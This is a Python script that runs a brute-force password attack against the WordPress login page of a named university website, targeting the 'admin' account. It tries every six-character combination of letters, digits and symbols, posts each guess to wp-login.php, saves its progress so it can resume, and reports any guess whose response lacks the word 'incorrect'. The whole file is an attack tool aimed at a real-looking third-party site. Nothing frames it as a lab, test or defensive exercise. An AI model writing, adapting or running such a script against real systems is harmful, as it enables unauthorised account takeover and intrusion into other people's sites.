import itertools
import string
import requests
import time
import os

CHARACTERS = string.ascii_letters + string.digits + "!@#$%^&*()-_=+[]{}|;:',.<>?/"
LOGIN_URL = "https://admasuniversity.edu.et/wp-login.php"
USERNAME = "admin"
PASSWORD_LENGTH = 6
SAVE_FILE = "brute_force_last_pwd.txt"

def get_start_password():
    if os.path.exists(SAVE_FILE):
        with open(SAVE_FILE, "r") as f:
            return f.read().strip()
    return None

def save_password(password):
    with open(SAVE_FILE, "w") as f:
        f.write(password)

def brute_force_password():
    start_time = time.time()
    start_password = get_start_password()

    skip = True if start_password else False

    for attempt in itertools.product(CHARACTERS, repeat=PASSWORD_LENGTH):
        password = "".join(attempt)

        if skip:
            if password == start_password:
                skip = False  # Found where to resume
            continue

        print(f"[🔍] Trying: {password}")
        save_password(password)

        payload = {
            "log": USERNAME,
            "pwd": password
        }

        response = requests.post(LOGIN_URL, data=payload)

        if "incorrect" not in response.text.lower():
            end_time = time.time()
            print(f"\n✅ Password found: {password}")
            print(f"⏱️ Time taken: {end_time - start_time:.2f} seconds")
            os.remove(SAVE_FILE)
            return

    print("\n❌ Password not found.")
    os.remove(SAVE_FILE)

brute_force_password()
